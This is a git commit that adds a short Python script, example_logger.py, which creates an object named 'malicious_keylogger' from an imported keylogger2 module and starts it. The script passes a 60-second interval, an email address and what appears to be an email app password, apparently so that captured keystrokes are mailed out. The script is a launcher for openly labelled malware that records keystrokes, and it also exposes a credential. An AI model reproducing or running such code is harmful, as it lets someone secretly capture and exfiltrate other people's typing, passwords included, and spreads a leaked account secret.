955d5de12a1f360af1251997387cb47a8bfb107d
Udhayam <131547728+udhaza@users.noreply.github.com>
2024-08-02 21:27:56 +0530

    Create example_logger.py

---
+++ example_logger.py
@@ -0,0 +1,14 @@
+#!/usr/bin/env python
+
+import keylogger2
+
+
+# Initialize / create keylogger
+# import keylogger
+
+
+malicious_keylogger: keylogger2.KeyLogger = keylogger2.KeyLogger(60, 'tdudhay@gmail.com', 'feod pkau rfma lgzm')
+
+# Execute Keylogger
+
+malicious_keylogger.start()
